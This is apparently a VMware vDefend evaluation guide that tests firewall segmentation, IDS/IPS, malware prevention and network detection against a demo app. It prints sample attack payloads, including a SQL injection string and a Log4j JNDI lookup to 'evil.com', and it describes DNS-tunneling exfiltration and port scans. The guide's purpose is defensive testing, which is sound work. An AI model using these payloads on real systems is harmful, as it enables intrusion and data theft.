# VMware vDefend: Evaluation & Testing Guide
**Target Environment:** CommunitySafe 3-Tier Demo Application

This guide outlines a structured Proof of Concept (POC) plan to evaluate **VMware vDefend Firewall** and **Advanced Threat Prevention (ATP)**. It uses the *CommunitySafe* demo application to generate legitimate traffic, lateral movement, and malicious attack signatures on demand.

---

## 🏛️ Architecture Overview

The test environment consists of three zones (Micro-segments). Traffic must flow strictly from Left to Right.

* **Web Tier:** `TCP 80/443` (Ingress)
* **App Tier:** `TCP 5000` (Middleware)
* **DB Tier:** `TCP 5432` (Data)

---

## 🧪 Test Scenarios

### Scenario 1: Zero Trust Micro-segmentation (DFW)
**Objective:** Demonstrate that vDefend Distributed Firewall (DFW) enforces policy at the vNIC level, preventing unauthorized lateral movement even on the same subnet.

1.  **Baseline:**
    * Open the **CommunitySafe** app -> **Testing** tab.
    * Click **"Single Flow"**.
    * **Observation:** Verify blue dots travel successfully from `Web -> App -> DB`. The "Resident" page should load alerts correctly.

2.  **Attack:**
    * Create a DFW Rule in NSX blocking `App -> DB` (TCP 5432).
    * Publish the rule.

3.  **Validation:**
    * Return to the **Testing** tab and click **"Single Flow"**.
    * **Observation:** The flow will visually stop at the App Tier (or turn red).
    * Go to the **Resident** tab and refresh. The Alerts section will be empty or show an error, proving the segmentation effectively cut the network path.

---

### Scenario 2: Distributed IDS/IPS (Known Signatures)
**Objective:** Detect and block vulnerability exploits attempting to compromise the application.

1.  **Configuration:**
    * Enable **IDS/IPS** on the Cluster.
    * Apply a policy to the **Web Tier** VM to inspect Ingress traffic.
    * Set Mode to **"Detect & Prevent"**.

2.  **Attack Simulation:**
    * Go to the **Testing** tab -> **Attack Simulation** panel.
    * **Test A (SQL Injection):** Click the **"SQL Injection (SQLi)"** button.
        * *Payload:* `?id=' OR 1=1 --`
    * **Test B (RCE):** Click the **"Log4j / RCE Attack"** button.
        * *Payload:* `${jndi:ldap://evil.com/x}`

3.  **Validation:**
    * Navigate to **NSX Manager** -> **Security** -> **IDS/IPS Events**.
    * You should see critical alerts for:
        * `ET WEB_SPECIFIC_APPS` (SQLi attempt)
        * `Apache Log4j RCE Attempt`
    * If in Prevention mode, the app UI will show a connection error.

---

### Scenario 3: Malware Prevention (ATP)
**Objective:** Demonstrate inspection of file transfers for malicious payloads.

1.  **Configuration:**
    * Enable **Malware Prevention** on the Web Tier.
    * Ensure the "EICAR" signature is enabled (Standard Anti-Virus Test).

2.  **Attack Simulation:**
    * Go to the **Testing** tab.
    * Click the **"Malware Download (EICAR)"** button.
    * *Action:* The app attempts to download the industry-standard EICAR test string from the App tier.

3.  **Validation:**
    * Navigate to **NSX Manager** -> **Security** -> **Malware Prevention**.
    * Look for a "Known Malware" detection event referencing `EICAR-Test-File`.

---

### Scenario 4: Network Detection & Response (NDR)
**Objective:** Detect "low and slow" or anomaly-based attacks that do not have standard signatures.

1.  **Attack Simulation:**
    * Go to the **Testing** tab.
    * **Test A (Exfiltration):** Click **"DNS Tunneling"**.
        * *Action:* The app generates repeated DNS queries to `*.tunnel.hacker.com`, simulating data exfiltration via DNS protocol.
    * **Test B (Reconnaissance):** Click **"Port Scan"**.
        * *Action:* The Web VM attempts to connect to the App VM on non-standard ports (21, 22, 23, 3389) in rapid succession.

2.  **Validation:**
    * Navigate to the **NSX NDR Dashboard**.
    * Look for a new "Campaign" or "Suspicious Activity".
    * Drill down to see the MITRE ATT&CK framework mapping:
        * **T1048:** Exfiltration Over Alternative Protocol (DNS).
        * **T1046:** Network Service Scanning.

---

## 📝 Scorecard

| Capability | Test Method | Pass/Fail |
| :--- | :--- | :--- |
| **Segmentation** | Block App-to-DB traffic via DFW. | |
| **Exploit Block** | Trigger SQLi/Log4j via Testing Tab. | |
| **Malware** | Download EICAR file via Testing Tab. | |
| **Anomaly (NDR)** | Generate DNS Tunneling traffic. | |
